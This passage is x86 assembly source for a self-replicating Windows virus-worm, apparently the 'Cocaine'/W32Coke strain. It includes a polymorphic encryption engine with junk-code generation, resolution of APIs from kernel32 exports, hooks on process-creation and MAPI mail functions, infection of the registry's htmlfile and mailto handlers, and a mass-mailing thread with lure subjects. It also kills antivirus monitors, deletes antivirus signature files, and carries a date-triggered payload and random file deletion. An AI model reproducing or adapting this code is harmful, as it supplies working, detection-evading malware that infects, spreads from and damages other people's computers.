          sub wo [ebp+(ofs addr-ofs vcode)], 100h
          lea esi, [ebp+(ofs ssize-ofs vcode)]
          call copy_line                          ;optimization!
          sub edi, 6
          call update_address                     ;set size
          mov eax, 000A0D00h+'"'
          stosd
          dec edi
          lea esi, [ebp+(ofs coda-ofs vcode)]     ;copy final shit
          call copy_line
          ret
   script endp

   dbgscript dd 0

   dbgscript_size dd 0

   intro    db 'Open "C:\COCAINE.SRC" For OutPut As '
   dmt1     db '0', 13, 10
   dmt2     db 'Print #0, "N C:\W32COKE.EX"',13,10,0

   outcmd   db 'Print #0, "E ',0

   ssize    db 'Print #0, "RCX"', 13, 10, 0

   coda     db 'Print #0, "W"', 13, 10
   dmt3     db 'Print #0, "Q"', 13, 10
   dmt4     db 'Print #0, ""', 13, 10
   dmt5     db 'Close #0', 13, 10, 0

   debugmutator proc
          pushad
          mov eax, 9
          call random
          inc eax
          add by [ebp+(ofs dmt1-ofs vcode)], al
          add by [ebp+(ofs dmt2-ofs vcode)+7], al
          add by [ebp+(ofs outcmd-ofs vcode)+7], al
          add by [ebp+(ofs ssize-ofs vcode)+7], al
          add by [ebp+(ofs coda-ofs vcode)+7], al
          add by [ebp+(ofs dmt3-ofs vcode)+7], al
          add by [ebp+(ofs dmt4-ofs vcode)+7], al
          add by [ebp+(ofs dmt5-ofs vcode)+7], al
          popad
          ret
   debugmutator endp

   macro_end equ this byte

   MakeVar proc
          push ecx
          push eax
          mov eax, 5
          call random
          add eax, 4
          mov ecx, eax
     @@1:
          mov al, 'Z'-'A'
          call random
          add al, 'A'
          call random_f
          jc @@2
          sub al, 'A'-'a'
     @@2:
          stosb
          push ecx
          push edi
          call @@3
          db 'AaEeIiOoUu'
     @@3:
          pop edi
          mov ecx, 10
          repne scasb
          jecxz @@4
          dec dwo [esp-1]
     @@4:
          pop edi
          pop ecx
          loop @@1
          stosb
          pop eax
          pop ecx
          ret
   MakeVar endp

   PatchIT proc
          push esi
          lea edi, [esi+ecx]                      ;destination
          mov ecx, 4
          push eax
          mov esi, esp                            ;fake buffer in stack
          call WriteMem
          pop esi                                 ;remove shit
          pop esi
          ret
   PatchIT endp

   _base  dd 400000h

   NUM_TOPICS EQU 8

   topics equ this byte
          dd ofs t0-ofs vcode
          dd ofs t0-ofs vcode
          dd ofs t0-ofs vcode
          dd ofs t1-ofs vcode
          dd ofs t2-ofs vcode
          dd ofs t3-ofs vcode
          dd ofs t4-ofs vcode
          dd ofs t5-ofs vcode

   t0     db '', 0
   t1     db 'Kewl page!', 0
   t2     db 'Improvement to your page', 0
   t3     db 'Your page r0x0r!', 0
   t4     db 'You must see this...', 0
   t5     db 'Secret stuff!', 0


   ;ESI=Code to encript    (Big enought; Swappable)
   ;EDI=Place to put code  (Big enought; Swappable)
   ;ECX=Size of code to encript
   ;EAX=Delta entrypoint
   ;EDX=VA where code will run in host
   ;
   ;EDI=Final buffer
   ;ECX=Size
   ;EAX=New delta entrypoint
   mutate proc
          cld
          push eax
          call crypt_poly                         ;decript engine
          mov [ebp+(ofs rva-ofs vcode)], edx
          call random0
          mov [ebp+(ofs cp_key-ofs vcode)], al    ;next memory key
          mov eax, [ebp+(ofs seed-ofs vcode)]
          mov [ebp+(ofs pseed-ofs vcode)], eax
          mov eax, 3
          call random
          push 2
          pop ebx
          add ebx, eax
          or bl, 1
          pop eax
     @@1:
          push ebx
          call poly
          xchg esi, edi                           ;permute bufferz
          pop ebx
          dec ebx
          jnz @@1                                 ;next loop
          xchg esi, edi
          call crypt_poly                         ;encript poly engine after use
          ret
   mutate endp

   crypt_poly proc
          pushad
          mov al, by [ebp+(ofs cp_key-ofs vcode)]
          mov ecx, ofs egtable-ofs poly
          lea esi, [ebp+(ofs poly-ofs vcode)]
     @@1:
          xor by [esi], al
          inc esi
          loop @@1
          popad
          ret
   crypt_poly endp

   rbuf   db MAX_BRANCH*(128+4+4) dup (0)

   vinit  proc
          mov esp, [esp+8]
          call delta
          lea eax, [ebp+(ofs seh-ofs vcode)]
          mov [esp-4], eax
          call init                               ;get api entries
          jc @@3
          sub eax, eax
          mov ecx, MAX_SOCK+1
          lea edi, [ebp+(ofs _socket-ofs vcode)]
          rep stosd
          mov [ebp+(ofs email_w-ofs vcode)], eax
          mov [ebp+(ofs mm_on_off-ofs vcode)], eax
          mov [ebp+(ofs mdeep-ofs vcode)], al
          lea eax, [ebp+(ofs kernel-ofs vcode)]
          push eax
          call [ebp+(ofs _GetModuleHandle-ofs vcode)]
          mov [ebp+(ofs K32-ofs vcode)], eax      ;save kernel32 base
          lea esi, [ebp+(ofs k32_names-ofs vcode)]
          lea edi, [ebp+(ofs k32_address-ofs vcode)]
     @@1:
          lodsd
          or eax, eax
          jz @@2
          add eax, ebp
          call gpa_kernel32                       ;get all api we want from k32
          jc @@3
          stosd
          jmp @@1
          db 0b9h
     @@2:
          lea eax, [ebp+(ofs user-ofs vcode)]
          push eax
          call [ebp+(ofs _LoadLibraryA-ofs vcode)]
          mov [ebp+(ofs U32-ofs vcode)], eax      ;save user base
     @@4:
          lodsd
          or eax, eax
          jz @@5
          mov ebx, [ebp+(ofs U32-ofs vcode)]
          add eax, ebp
          call gpa_custom                         ;get all api we want again
          jc @@3
          stosd
          jmp @@4
          db 0eah
     @@5:

          call @@adf
          db 'ADVAPI32',0
     @@adf:
          call [ebp+(ofs _LoadLibraryA-ofs vcode)]
          call @@a11
          db 'RegSetValueExA', 0
     @@a11:
          push eax
          call @@aaa
          db 'RegCreateKeyExA', 0
     @@aaa:
          push eax
          call @@baa
          db 'RegOpenKeyExA', 0
     @@baa:
          push eax
          call @@caa
          db 'RegQueryValueExA', 0
     @@caa:
          push eax
          call @@d
          db 'RegCloseKey', 0
     @@d:
          push eax                                ;retrieve all needed APIs
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _RegCloseKey-ofs vcode)], eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _RegQueryValueEx-ofs vcode)], eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _RegOpenKeyEx-ofs vcode)], eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _RegCreateKeyEx-ofs vcode)], eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _RegSetValueEx-ofs vcode)], eax

          lea eax, [ebp+(ofs wavp-ofs vcode)]
          sub ecx, ecx
          push eax
          push ecx
          call [ebp+(ofs _FindWindowA-ofs vcode)]
          or eax,eax
          jz @@b
          push ecx                                ;terminate AVPM using vg scheme
          push ecx
          push 16
          push eax
          call [ebp+(ofs _PostMessageA-ofs vcode)]
     @@b:

          lea eax, [ebp+(ofs shitfile-ofs vcode)]
          push eax
          call DeleteShitFile

          call @@a1
          db 'KERNEL.AVC', 0
     @@a1:
          call DeleteShitFile
          call @@a2
          db 'SIGN.DEF', 0
     @@a2:
          call DeleteShitFile
          call @@a3
          db 'FIND.DRV', 0
     @@a3:
          call DeleteShitFile
          call @@a4
          db 'NOD32.000', 0
     @@a4:
          call DeleteShitFile
          call @@a5
          db 'DSAVIO32.DLL', 0
     @@a5:
          call DeleteShitFile
          call @@a6
          db 'SCAN.DAT', 0
     @@a6:
          call DeleteShitFile
          call @@a7
          db 'VIRSCAN.DAT', 0
     @@a7:
          call DeleteShitFile

          call @@a8
          db 'C:\COCAINE.SRC', 0
     @@a8:
          call DeleteShitFile

          lea ebx, [ebp+(ofs ancevsys-ofs vcode)]
          push 83h
          push ebx
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]

          lea esi, [ebp+(ofs current_time-ofs vcode)]
          push esi
          call [ebp+(ofs _GetSystemTime-ofs vcode)]
          lea edi, [ebp+(ofs seed-ofs vcode)]
          sub eax, eax
          lodsw
          lodsw                                   ;init seed with dayofweek/day
          movsd
          push eax
          sub al, MONTH_DELAY                     ;enougth time passed?
          jnc @@6
          add al, 12
     @@6:
          cmp by [ebp+(ofs FunDate-ofs vcode)], al
          mov al, 90h
          je @@7
          add al, 0c3h-90h                        ;nop/ret flip
     @@7:
          mov by [ebp+(ofs Payload-ofs vcode)], al
          pop eax
          add al, MONTH_DELAY
          aam 12                                  ;set trigger date
          mov by [ebp+(ofs FunDate-ofs vcode)], al

          call random0
          mov [ebp+(ofs key1-ofs vcode)], eax
          call random0
          mov [ebp+(ofs key2-ofs vcode)], eax

          call macro_crypt                        ;decript macro stuff

          call MacroSpread

          call random0
          add by [ebp+(ofs macro_key-ofs vcode)], al
          call macro_crypt                        ;encript macro stuff

          lea edx, [ebp+(ofs directory-ofs vcode)]
          push edx
          push MAX_PATH
          call [ebp+(ofs _GetCurrentDirectoryA-ofs vcode)]
          test eax, eax
          jz @@10
          call ProcessDir
     @@10:
   IF DIRECT EQ TRUE
          lea edx, [ebp+(ofs directory-ofs vcode)]
          push MAX_PATH
          push edx
          call [ebp+(ofs _GetWindowsDirectoryA-ofs vcode)]
          test eax, eax
          jz @@11
          call ProcessDir
     @@11:
   ;       lea edx, [ebp+(ofs directory-ofs vcode)]
   ;       push MAX_PATH
   ;       push edx
   ;       call [ebp+(ofs _GetSystemDirectoryA-ofs vcode)]
   ;       test eax, eax
   ;       jz @@12
   ;       call ProcessDir
   ;  @@12:
   ENDIF
          mov esi, [ebp+(ofs _base-ofs vcode)]
     @@a:
          lea eax, [ebp+(ofs NewWinExec-ofs vcode)]
          mov ecx, 0                              ;hook per-process functionz
   OldWinExec equ dwo $-4
          jecxz @@8
          call PatchIT
     @@8:
          lea eax, [ebp+(ofs NewCreateProcessA-ofs vcode)]
          mov ecx, 0
   OldCreateProcessA equ dwo $-4
          jecxz @@9
          call PatchIT
     @@9:
          lea eax, [ebp+(ofs NewMAPISendMail-ofs vcode)]
          mov ecx, 0
   OldMAPISendMail equ dwo $-4
          jecxz @@92
          call PatchIT
     @@92:
          lea eax, [ebp+(ofs NewGetProcAddress-ofs vcode)]
          mov ecx, 0
   OldGetProcAddress equ dwo $-4
          jecxz @@93
          call PatchIT
     @@93:

          call Payload
     @@3:
          call delta
          cmp by [ebp+(ofs RestoreChunkz-ofs vcode)], FALSE
          je @@aa

          mov edx, MAX_BRANCH
          lea esi, [ebp+(ofs rbuf-ofs vcode)]
     @@rc1:
          lodsd
          add eax, [ebp+(ofs _base-ofs vcode)]
          mov edi, eax
          lodsd
          mov ecx, eax
          pushad
          call WriteMem
          popad
          lea esi, [esi+ecx]
          dec edx
          jnz @@rc1

     @@aa:
          mov eax, 365
          call random
          cmp ax, 24
          jne @sajsj
          call GetList
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call DeleteShitFile
     @sajsj:

          call OpenAncev
          jc @@jdjd
          lea eax, [ebp+(ofs cokefile-ofs vcode)]
          push eax
          call DeleteShitFile
     @@jdjd:

          mov eax, NUM_TOPICS
          call random
          mov eax, [ebp+(ofs topics-ofs vcode)+(eax*4)]
          add eax, ebp
          mov [ebp+(ofs subject-ofs vcode)], eax

   IF DIRECT EQ TRUE
          inc dwo [ebp+(ofs what_key-ofs vcode)]
          call @@2323
          db 'SOFTWARE\Classes\htmlfile\shell\open\command', 0
     @@2323:
          pop eax
          call ConsultKey
          call FixKey
          sub eax, eax
          mov dwo [ebp+(ofs fsizel-ofs vcode)], eax
          mov dwo [ebp+(ofs mm_on_off-ofs vcode)], eax
          call Infect

          call @@2324
          db 'SOFTWARE\Classes\mailto\shell\open\command', 0
     @@2324:
          pop eax
          call ConsultKey
          call FixKey
          sub eax, eax
          mov dwo [ebp+(ofs fsizel-ofs vcode)], eax
          call Infect
          dec dwo [ebp+(ofs what_key-ofs vcode)]
   ENDIF

          sub eax, eax
          lea esi, [ebp+(ofs thread-ofs vcode)]
          push esi
          push eax
          push ebp
          lea esi, [ebp+(ofs MailThread-ofs vcode)]
          push esi
          push eax
          push eax
          call [ebp+(ofs _CreateThread-ofs vcode)]
          call http_install
     ret2host:
          pop dwo fs:[0]                          ;restore seh frame
          pop eax
          jmp host                                ;jmp to host
   vinit  endp

   host_entry equ dwo $-4

   seh:
          mov esp, [esp+8]
          jmp ret2host

   FixKey proc
          push -2
          pop ecx
          mov edi, esi
     @@0:
          lodsb
          cmp al, '"'
          je @@1
          test al, al
          jz @@2
          cmp al, ' '
          jne @@3
          cmp ecx, -2
          je @@2
     @@3:
          stosb
          jmp @@0
     @@1:
          inc ecx
          jecxz @@2
          jmp @@0
     @@2:
          sub eax, eax
          stosb
          ret
   FixKey endp

   cokefile db 'C:\COCAINE.SYS', 0

   init   proc
          mov ecx, esp
          call @@3
          mov esp, [esp+8]                        ;fix stack
     @@1:
          call delta
          stc                                     ;signal error
          mov cl, ?
          org $-1
     @@2:
          clc                                     ;signal sucess
          pop dwo fs:[0]                          ;restore seh frame
          sahf
          add esp, 4
          lahf
          ret
          db 081h
     @@3:
          sub eax, eax
          push dwo fs:[eax]
          mov fs:[eax], esp                       ;set new seh frame
          mov eax, 0                              ;is GetModuleHandleA imported?
   OldGetModuleHandleA equ dwo $-4
          test eax, eax
          jz @@5
          add eax, [ebp+(ofs _base-ofs vcode)]
          lea edx, [ebp+(ofs kernel-ofs vcode)]
          push edx
          call [eax]                              ;use imported API to get
          test eax, eax                           ;kernel32 module
          jz @@5
          mov edx, eax
          jmp @@4
     @@5:
          mov eax, 077f00000h                     ;wNT base
          push eax
          call check_base
          pop edx
          jz @@4
          mov eax, 077e00000h                     ;wNT 5 base
          push eax
          call check_base
          pop edx
          jz @@4
          mov eax, 0bff70000h                     ;w9x base
          push eax
          call check_base
          pop edx
          jnz @@1
     @@4:
          mov eax, edx
          mov ebx, eax
          call delta
          add eax, [eax+3ch]
          cmp dwo [eax], 'EP'
          jne @@1
          add ebx, [eax+120]                      ;export table
          lea eax, [ebp+(ofs sGetModuleHandle-ofs vcode)]
          mov dwo [ebp+(ofs size_search-ofs vcode)], 17
          mov [ebp+(ofs string_search-ofs vcode)], eax
          call search_et                          ;get GetModuleHandle
          jc @@1
          mov [ebp+(ofs _GetModuleHandle-ofs vcode)], eax
          lea eax, [ebp+(ofs sGetProcAddress-ofs vcode)]
          mov dwo [ebp+(ofs size_search-ofs vcode)], 15
          mov [ebp+(ofs string_search-ofs vcode)], eax
          call search_et                          ;get GetProcAddress
          jc @@1
          mov [ebp+(ofs _GetProcAddress-ofs vcode)], eax
          jmp @@2
   init   endp

   check_base proc
          call @@1
          mov esp, [esp+8]
          call delta
          cmp eax, esp
          jmp @@0
     @@1:
          push dwo fs:[0]
          mov fs:[0], esp
          cmp wo [eax], 'ZM'
     @@0:
          pop dwo fs:[0]
          pop eax
          ret
   check_base endp

   search_et proc
          mov eax, [ebx+32]
          add eax, edx                            ;name table ptr
     @@1:
          mov esi, [eax]
          or esi, esi
          jz @@3                                  ;nul ptr
          add esi, edx
          mov edi, 0
   string_search equ dwo $-4
          mov ecx, 0
   size_search equ dwo $-4
          rep cmpsb                               ;the one we search?
          jz @@2
          add eax, 4
          jmp @@1                                 ;check next api
     @@2:
          sub eax, [ebx+32]
          sub eax, edx
          shr eax, 1                              ;div by 2
          add eax, [ebx+36]
          add eax, edx
          movzx eax, wo [eax]
          shl eax, 2                              ;mul by 4
          add eax, [ebx+28]
          add eax, edx
          mov eax, [eax]
          add eax, edx
          clc                                     ;signal sucess
          mov cl, 12h
        org $-1
     @@3:
          stc                                     ;signal error
          ret
   search_et endp

   gpa_custom proc
          push eax                                ;pointer to api wanted
          push ebx                                ;module handle
          jmp _gpa
          db 66h

   gpa_kernel32 proc
          push eax
          push dwo [ebp+(ofs K32-ofs vcode)]
     _gpa:
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          or eax, eax
          jz @@1
          clc
          mov cl, 12h
        org $-1
     @@1:
          stc
          ret
   gpa_kernel32 endp
   gpa_custom endp

   MAX_RECURSION   = 3
   JMP_MAX         = 16
   MAX_SUBROUTINES = 16

   flg    record{
          _key:1,                                 ;1key isnt necessary     ;4
          _encriptor:2                            ;XOR = 00
                                                  ;NOT = 01
                                                  ;ADD = 10
                                                  ;SUB = 11                ;23
          _bwd_fwd:1,                             ;0inc/1dec counter       ;1
          _direction:1,                           ;1backward/0forward      ;0
          }

          pushf
          db 09ah

   poly   proc                                    ;encripted in memory!
          push esi
          mov [ebp+(ofs entry-ofs vcode)], eax
          mov [ebp+(ofs buffer-ofs vcode)], edi
          mov [ebp+(ofs _size-ofs vcode)], ecx    ;save entry values
          sub eax, eax
          mov [ebp+(ofs reg32-ofs vcode)], eax
          mov [ebp+(ofs recurse-ofs vcode)], eax  ;init internal vars
          mov [ebp+(ofs lparm-ofs vcode)], eax
          mov [ebp+(ofs lvars-ofs vcode)], eax
          mov [ebp+(ofs subs_index-ofs vcode)], eax
          mov [ebp+(ofs s_into-ofs vcode)], eax   ;(dword)
          call random0
          and eax, mask _bwd_fwd + mask _direction + mask _encriptor
          mov [ebp+(ofs flagz-ofs vcode)], eax    ;set engine flagz
          mov edx, eax
          and edx, 11b
          call random0
          mov [ebp+(ofs key-ofs vcode)], al       ;choose key
          lea ebx, [ebp+(ofs crypt_table-ofs vcode)]
          test edx, 10b
          jz @@0
          add ebx, 6                              ;next table
     @@0:
          test edx, 01b
          jz @@1
          add ebx, 3                              ;second choice
     @@1:
          mov ax, wo [ebx]
          mov [ebp+(ofs _dec-ofs vcode)], ax
          mov al, by [ebx+2]
          mov [ebp+(ofs _enc-ofs vcode)], al
          dec edx
          jnz @@2
          mov by [ebp+(ofs key-ofs vcode)], 0D0h  ;not dont use key
          bts dwo [ebp+(ofs flagz-ofs vcode)], 6  ;(mask _key)
     @@2:
          jmp @@3                                 ;flush piq
     @@3:
          lodsb
     _enc db 00
     key  db 00
          stosb
          loop @@3                                ;crypt code
          mov eax, 64
          call random
          mov ecx, eax
          call _shit
          mov [ebp+(ofs decriptor-ofs vcode)], edi;here the decriptor start
          call garble                             ;start of decriptor
          lea ebx, [ebp+(ofs make_counter-ofs vcode)]
          lea edx, [ebp+(ofs make_pointer-ofs vcode)]
          call swapper                            ;setup start of poly decriptor
          push edi                                ;loop start here
          call garble
          mov eax, [ebp+(ofs _dec-ofs vcode)]
          mov edx, [ebp+(ofs p_reg-ofs vcode)]
          or ah, dl
          stosw                                   ;store crypt instr
          bt dwo [ebp+(ofs flagz-ofs vcode)], 6   ;(mask _key)
          jc @@4
          mov al, by [ebp+(ofs key-ofs vcode)]
          stosb                                   ;store key
     @@4:
          call garble
          lea ebx, [ebp+(ofs upd_counter-ofs vcode)]
          lea edx, [ebp+(ofs upd_pointer-ofs vcode)]
          call swapper                            ;update counter and pointer
          mov edx, [ebp+(ofs c_reg-ofs vcode)]
          call random
          jc @@5
          call random
          js @@7
          mov eax, 0c00bh                         ;or reg, reg
          jmp @@8
     @@7:
          mov eax, 0c085h                         ;test reg, reg
     @@8:
          mov ecx, edx
          shl edx, 3
          or ah, dl
          or ah, cl
          stosw
          jmp @@6
     @@5:
          mov eax, 0f883h
          or ah, dl
          stosw                                   ;cmp reg, 0
          sub eax, eax
          stosb
     @@6:
          mov ax, 850fh                           ;do conditional jump
          stosw
          pop edx
          sub edx, edi                            ;delta distance
          sub edx, 4
          mov eax, edx
          stosd                                   ;jnz start_of_loop
          mov dwo [ebp+(ofs reg32-ofs vcode)], 0
          call garble
          mov al, 0e9h
          stosb                                   ;jmp start
          mov eax, edi
          sub eax, [ebp+(ofs buffer-ofs vcode)]
          sub eax, [ebp+(ofs entry-ofs vcode)]
          add eax, 4
          neg eax
          stosd
          call garble
          call garble
          mov ecx, [ebp+(ofs buffer-ofs vcode)]   ;(this allow the calls be
          sub edi, ecx                            ;forward/backward direction)
          xchg edi, ecx
          mov eax, [ebp+(ofs decriptor-ofs vcode)];calculate new entrypoint
          sub eax, [ebp+(ofs buffer-ofs vcode)]   ;relative to previous rva
          pop esi
          ret
   poly   endp

   gar    proc
          call random0                            ;get any reg
          and eax, 0111b
          cmp al, 4                               ;esp never
          je gar
          ret
   gar    endp

   get8free proc
          mov eax, [ebp+(ofs reg32-ofs vcode)]
          and eax, 01111b
          cmp eax, 01111b
          jne @@1
          stc
          ret
     @@1:
          call random0
          and eax, 011b
          bt [ebp+(ofs reg32-ofs vcode)], eax     ;al,cl,dl,bl
          jc get8free
          call random_f
          jc @@2
          or al, 0100b                            ;ah,ch,dh,bh
     @@2:
          ret
   get8free endp

   get32reg proc                                  ;get a free 32bit reg
          call gar                                ;and mark it as used
          bts [ebp+(ofs reg32-ofs vcode)], eax
          jc get32reg
          ret
   get32reg endp

   get32free proc                                 ;get a free 32bit reg
          call gar                                ;and NOT mark it as used
          bt [ebp+(ofs reg32-ofs vcode)], eax
          jc get32free
          ret
   get32free endp

   swapper proc
          call random0
          jc @@1
          xchg edx, ebx                           ;change order
     @@1:
          push edx
          call ebx                                ;call 1th
          call garble
          pop edx
          call edx                                ;call 2th
          call garble
          ret
   swapper endp

   make_counter proc
          call get32reg
          mov [ebp+(ofs c_reg-ofs vcode)], eax
          cmp al, 5                               ;ebp complicate methodz
          jne @@2
          btr [ebp+(ofs reg32-ofs vcode)], eax    ;free ebp
          jmp make_counter
     @@2:
          or al, 0b8h
          stosb
          mov eax, [ebp+(ofs _size-ofs vcode)]
          test dwo [ebp+(ofs flagz-ofs vcode)], mask _bwd_fwd
          jnz @@1
          neg eax                                 ;counter will be INCed
     @@1:
          stosd
          ret
   make_counter endp

   make_pointer proc
          call get32reg
          cmp al, 5                               ;ebp complicate methodz
          jne @@1
          btr [ebp+(ofs reg32-ofs vcode)], eax    ;free ebp
          jmp make_pointer
     @@1:
          mov [ebp+(ofs p_reg-ofs vcode)], eax
          or al, 0b8h
          stosb
          mov eax, [ebp+(ofs rva-ofs vcode)]
          test dwo [ebp+(ofs flagz-ofs vcode)], mask _direction
          jz @@2
          add eax, dwo [ebp+(ofs _size-ofs vcode)];pointer will be DECced
          dec eax
     @@2:
          stosd
          ret
   make_pointer endp

   upd_pointer:
          mov eax, [ebp+(ofs p_reg-ofs vcode)]
          test dwo [ebp+(ofs flagz-ofs vcode)], mask _direction
          jmp _update_reg

   upd_counter:
          mov eax, [ebp+(ofs c_reg-ofs vcode)]
          test dwo [ebp+(ofs flagz-ofs vcode)], mask _bwd_fwd

   _update_reg proc                               ;z=inc/nz=dec
          mov ebx, 0140h                          ;inc
          mov edx, 0c083h                         ;add
          jz @@0
          xor edx, 0c083h xor 0e883h              ;sub
          mov bl, 48h                             ;dec
     @@0:
          push eax
          mov eax, 3
          call random
          or eax, eax
          jz @@2                                  ;choose method
          dec eax
          jz @@1
          xor edx, 0c083h xor 0e883h              ;sub<->add
          neg bh                                  ;neg(1)
     @@1:
          pop ecx
          mov eax, edx
          or ah, cl                               ;patch reg
          stosw
          movzx eax, bh                           ;signal
          jmp @@3
     @@2:
          pop ecx
          xchg eax, ebx
          or al, cl                               ;patch reg
     @@3:
          stosb
          ret
   _update_reg endp

   garble proc
          pushad
          inc by [ebp+(ofs recurse-ofs vcode)]
          cmp by [ebp+(ofs recurse-ofs vcode)], MAX_RECURSION
          jae @@1
          mov eax, 8
          call random
          add eax, 4
          mov ecx, eax                            ;4-11 instructionz
     @@0:
          push ecx
          lea esi, [ebp+(ofs gtable-ofs vcode)]
          mov eax, (ofs egtable - ofs gtable)/4
          call random
          shl eax, 2
          add esi, eax
          lodsd
          add eax, ebp
          cmp by [ebp+(ofs lgarble-ofs vcode)], al
          je @@2                                  ;same?
          mov by [ebp+(ofs lgarble-ofs vcode)], al
          call eax
     @@2:
          pop ecx
          loop @@0
     @@1:
          dec by [ebp+(ofs recurse-ofs vcode)]
          mov [esp], edi                          ;copy of edi in stack
          popad
          ret
   garble endp

   make_subs proc
          cmp by [ebp+(ofs s_into-ofs vcode)], 0
          jne @@1
          cmp dwo [ebp+(ofs subs_index-ofs vcode)], MAX_SUBROUTINES
          ja @@1
          inc by [ebp+(ofs s_into-ofs vcode)]      ;mark into
          mov eax, [ebp+(ofs subs_index-ofs vcode)]
          inc dwo [ebp+(ofs subs_index-ofs vcode)]
          mov ecx, 6
          cdq
          mul ecx
          lea esi, [ebp+eax+(ofs subs_table-ofs vcode)]
          mov al, 0e9h
          stosb
          stosd
          push edi                                ;[esp]-4 = skip_jmp
          call garble
          mov [esi], edi                          ;where sub is
          mov eax, 5
          call random                             ;number of paramz pushed
          mov [esi.4], al                         ;by caller
          mov eax, 5
          call random                             ;number of local variables
          mov [esi.5], al
          test eax, eax                           ;if not local variables, then
          jz @@0                                  ;dont alloc stack
          mov ebx, eax
          shl ebx, 2                              ;displacement in dwords
          mov al, 0c8h
          stosb                                   ;enter
          mov eax, ebx
          stosd                                   ;size/deep
          dec edi
          jmp @@2
     @@0:
          mov al, 55h
          stosb                                   ;push ebp
          mov ax, 0ec8bh
          stosw                                   ;mov ebp, esp
     @@2:
          push dwo [ebp+(ofs reg32-ofs vcode)]    ;save reg state
          mov by [ebp+(ofs _pusha-ofs vcode)], 0  ;no use pusha at start
          mov eax, 3
          call random
          test eax, eax
          je @@4                                  ;will use PUSHA!
     @@10:
          call random0                            ;choose regs
          and eax, 11111111b
          or eax,  00110000b                      ;set EBP and ESP too
          cmp al, -1
          jz @@10
          mov [ebp+(ofs reg32-ofs vcode)], eax
          and eax, 11001111b
          not al                                  ;free regs are set bits now!
          test eax, eax
          jz @@10
     @@5:
          bsf edx, eax
          jz @@6                                  ;no more regs free?
          btc eax, edx                            ;clear it
          cmp dl, 4
          je @@5
          cmp dl, 5                               ;ebp-esp dont need be saved
          je @@5
          push eax
          mov eax, edx                            ;get position
          or al, 50h
          stosb                                   ;store as PUSH
          pop eax
          jmp @@5
     @@4:
          mov by [ebp+(ofs _pusha-ofs vcode)], -1 ;pusha used!
          mov dwo [ebp+(ofs reg32-ofs vcode)], 00110000b
          mov al, 60h                             ;set EBP and ESP as used
          stosb                                   ;pusha
     @@6:
          movzx eax, by [esi.4]
          mov [ebp+(ofs lparm-ofs vcode)], eax
          movzx eax, by [esi.5]
          mov [ebp+(ofs lvars-ofs vcode)], eax    ;set paramz to mem write/read
          call garble
          call garble
          call garble
          xor eax, eax
          mov [ebp+(ofs lparm-ofs vcode)], eax    ;disable mem write/read
          mov [ebp+(ofs lvars-ofs vcode)], eax
          mov al, [ebp+(ofs _pusha-ofs vcode)]
          inc al
          jnz @@7                                 ;well, do individual POPs
          mov al, 61h
          stosb                                   ;POPA
          jmp @@8
     @@7:
          mov eax, [ebp+(ofs reg32-ofs vcode)]
          and eax, 11001111b
          not al                                  ;free regs are set bits now!
     @@9:
          bsr edx, eax
          jz @@8                                  ;no more regs free?
          btc eax, edx                            ;clear it
          cmp dl, 4
          je @@9
          cmp dl, 5                               ;ebp-esp dont need be restored
          je @@9
          push eax
          mov eax, edx                            ;get position
          or al, 58h
          stosb                                   ;store as POP this time
          pop eax
          jmp @@9
     @@8:
          pop dwo [ebp+(ofs reg32-ofs vcode)]     ;restore reg state
     @@3:
          mov al, 0c9h
          stosb                                   ;leave
          mov al, 0c2h
          stosb                                   ;ret
          movzx eax, by [esi.4]
          shl eax, 2
          test eax, eax
          jz @@a
          stosw                                   ;clean params
          jmp @@b
     @@a:
          mov by [edi-1], 0c3h                    ;no paramz, use RETN
     @@b:
          call garble
          pop esi
          mov ecx, edi
          sub ecx, esi                            ;distance
          mov [esi-4], ecx                        ;patch jmp
          dec by [ebp+(ofs s_into-ofs vcode)]
     @@1:
          ret
   make_subs endp

   make_call proc
          cmp by [ebp+(ofs s_into-ofs vcode)], 0
          jne @@1                                 ;cant call while creating sub
          mov eax, [ebp+(ofs subs_index-ofs vcode)]
          test eax, eax
          jz @@1
          call random                             ;choose one of the subs ready
          mov ecx, 6
          cdq
          mul ecx
          lea esi, [ebp+eax+(ofs subs_table-ofs vcode)]
          movzx ecx, by [esi.4]
          jecxz @@2                               ;how much paramz it need?
     @@3:
          call gar
          or al, 50h                              ;push paramz
          stosb
          loop @@3
     @@2:
          mov al, 0e8h
          stosb                                   ;build call
          mov eax, dwo [esi]
          sub eax, edi
          sub eax,4
          stosd                                   ;store displacement
     @@1:
          ret
   make_call endp

   lea_dword proc
          mov al, 8dh
          stosb
          call get32free
          shl eax, 3
          push eax
          call gar
          pop edx
          or eax, edx
          or al, 80h
          stosb
          call random0
          stosd
          ret
   lea_dword endp

   math_byte proc
          mov eax, 8
          call random
          shl eax, 3
          or eax, 1000000011000000b               ;make math operation
          push eax
          call get8free
          pop edx
          jc @@1
          or eax, edx
          xchg al, ah
          stosw
          call random0
          stosb                                   ;byte
     @@1:
          ret
   math_byte endp

   math_word proc
          mov ax, 8166h
          stosw
          call _math_imm
          stosw
          ret
   math_word endp

   math_dword proc
          mov al, 81h
          stosb
          call _math_imm
          stosd
          ret
   math_dword endp

   _math_imm proc
          mov eax, 8
          call random
          shl eax, 3
          or al, 11000000b
          push eax
          call get32free
          pop edx
          or eax, edx                             ;patch reg into
          stosb
          call random0
          ret
   _math_imm endp

   push_pop proc
          call gar
          or al, 50h
          stosb
          call garble                             ;recurse into
          call get32free
          or al, 58h
          stosb
          ret
   push_pop endp

   jmpcn  proc
          mov eax, 0fh
          call random
          or ax, 0f80h                            ;jcc near
          xchg al, ah
          stosw
          stosd
          push edi
          call garble                             ;recurse
          pop esi
          mov eax, edi
          sub eax, esi
          mov dwo [esi-4], eax                    ;fix jcc
          ret
   jmpcn  endp

   jmpcs  proc
          mov eax, 0fh
          call random
          or al, 70h                              ;make jmp conditional
          stosw
          push edi
          call garble                             ;recurse
          pop esi
          push edi
          mov eax, esi
          xchg eax, edi
          sub eax, edi
          mov by [esi-1], al                      ;fix jcc
          or al, al
          jns @@1                                 ;jmp destiny too far?
          mov edi, esi
          dec edi
          dec edi
          call one_byte                           ;replace with 2 byte instr
